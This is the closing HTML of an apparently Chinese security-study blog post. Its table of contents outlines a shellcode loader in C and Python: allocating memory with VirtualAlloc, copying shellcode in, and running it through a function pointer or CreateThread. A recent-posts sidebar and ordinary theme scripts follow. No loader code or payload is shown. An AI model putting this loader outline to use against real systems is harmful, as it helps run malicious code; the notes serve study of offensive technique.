href="#%E6%97%A0%E7%AC%A6%E5%8F%B7%E5%AD%97%E8%8A%82%E6%95%B0%E7%BB%84"><span class="toc-number">11.2.4.</span> <span class="toc-text">无符号字节数组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#main%E5%87%BD%E6%95%B0"><span class="toc-number">11.2.5.</span> <span class="toc-text">main函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E7%B1%BB%E5%9E%8B%E6%8C%87%E9%92%88"><span class="toc-number">11.2.6.</span> <span class="toc-text">无类型指针</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#VirtualAlloc"><span class="toc-number">11.2.7.</span> <span class="toc-text">VirtualAlloc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%B3%E8%AF%B7%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98"><span class="toc-number">11.2.7.1.</span> <span class="toc-text">申请虚拟内存</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%8A%E6%94%BE%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E3%80%82"><span class="toc-number">11.2.7.2.</span> <span class="toc-text">释放虚拟内存。</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#memcpy"><span class="toc-number">11.2.8.</span> <span class="toc-text">memcpy()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#void-Memory"><span class="toc-number">11.2.9.</span> <span class="toc-text">((void(*)())Memory)();</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88"><span class="toc-number">11.2.9.1.</span> <span class="toc-text">函数指针</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%BA%E5%88%B6%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2"><span class="toc-number">11.2.9.2.</span> <span class="toc-text">强制类型转换</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#shellcodeLoder-Python%EF%BC%88%E5%AD%A6%E5%AE%8Cpython%E5%86%8D%E6%9D%A5%E7%9C%8B%EF%BC%89"><span class="toc-number">12.</span> <span class="toc-text">shellcodeLoder-Python（学完python再来看）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Python%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E5%8E%9F%E7%90%86"><span class="toc-number">12.1.</span> <span class="toc-text">Python内存加载原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ctypes%E5%BA%93"><span class="toc-number">12.2.</span> <span class="toc-text">Ctypes库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BD%AC%E6%8D%A2%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="toc-number">12.3.</span> <span class="toc-text">转换数据类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AEVirtualAlloc%E8%BF%94%E5%9B%9E%E7%B1%BB%E5%9E%8B"><span class="toc-number">12.4.</span> <span class="toc-text">设置VirtualAlloc返回类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#VirtualAlloc-%E5%87%BD%E6%95%B0%E7%94%B3%E8%AF%B7%E5%86%85%E5%AD%98"><span class="toc-number">12.5.</span> <span class="toc-text">VirtualAlloc 函数申请内存</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%86Shellcode%E8%BD%BD%E5%85%A5%E5%86%85%E5%AD%98"><span class="toc-number">12.6.</span> <span class="toc-text">将Shellcode载入内存</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CreateThread%E5%88%9B%E5%BB%BA%E7%BA%BF%E7%A8%8B%EF%BC%88%E5%BC%80%E5%A7%8B%E6%89%A7%E8%A1%8C%EF%BC%89"><span class="toc-number">12.7.</span> <span class="toc-text">CreateThread创建线程（开始执行）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%89%E5%BE%85%E5%88%9B%E5%BB%BA%E7%9A%84%E7%BA%BF%E7%A8%8B%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9D%9F"><span class="toc-number">12.8.</span> <span class="toc-text">等待创建的线程运行结束</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022-09-25-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/nmap%E5%AD%A6%E4%B9%A0/" title="nmap学习"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237561.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="nmap学习"/></a><div class="content"><a class="title" href="/2022-09-25-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/nmap%E5%AD%A6%E4%B9%A0/" title="nmap学习">nmap学习</a><time datetime="2022-09-25T14:02:18.531Z" title="更新于 2022-09-25 22:02:18">2022-09-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022-09-25-%E7%9F%A5%E8%AF%86/Linux/Linux-%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1/" title="Linux-日志审计"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211308766.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linux-日志审计"/></a><div class="content"><a class="title" href="/2022-09-25-%E7%9F%A5%E8%AF%86/Linux/Linux-%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1/" title="Linux-日志审计">Linux-日志审计</a><time datetime="2022-09-25T07:44:04.113Z" title="更新于 2022-09-25 15:44:04">2022-09-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022-09-25-WEB%E5%AE%89%E5%85%A8/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/0x12-Docker%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" title="0x12 - Docker未授权访问漏洞"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237542.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="0x12 - Docker未授权访问漏洞"/></a><div class="content"><a class="title" href="/2022-09-25-WEB%E5%AE%89%E5%85%A8/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/0x12-Docker%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" title="0x12 - Docker未授权访问漏洞">0x12 - Docker未授权访问漏洞</a><time datetime="2022-09-25T04:54:14.775Z" title="更新于 2022-09-25 12:54:14">2022-09-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022-09-24-WEB%E5%AE%89%E5%85%A8/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/0x12-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" title="0x12 - redis未授权访问漏洞"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237511.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="0x12 - redis未授权访问漏洞"/></a><div class="content"><a class="title" href="/2022-09-24-WEB%E5%AE%89%E5%85%A8/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/0x12-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" title="0x12 - redis未授权访问漏洞">0x12 - redis未授权访问漏洞</a><time datetime="2022-09-25T04:39:47.187Z" title="更新于 2022-09-25 12:39:47">2022-09-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022-09-23-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%9D%A2%E8%AF%95+%E7%AC%94%E8%AF%95/hw%E9%9D%A2%E8%AF%95%E9%A2%98/" title="hw面试题"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237572.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hw面试题"/></a><div class="content"><a class="title" href="/2022-09-23-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%9D%A2%E8%AF%95+%E7%AC%94%E8%AF%95/hw%E9%9D%A2%E8%AF%95%E9%A2%98/" title="hw面试题">hw面试题</a><time datetime="2022-09-25T03:36:22.237Z" title="更新于 2022-09-25 11:36:22">2022-09-25</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By 晚上十一点睡觉</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Welcome to 11pmsleep's blog ~~~ 该网站用来记录学习笔记及生活，欢迎交流技术~</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (true){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'ctM8NyGphVxEX1qXd84qXWNa-gzGzoHsz',
      appKey: 'Ryr4bqLMBmcscGhSAclo91Jv',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: true
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>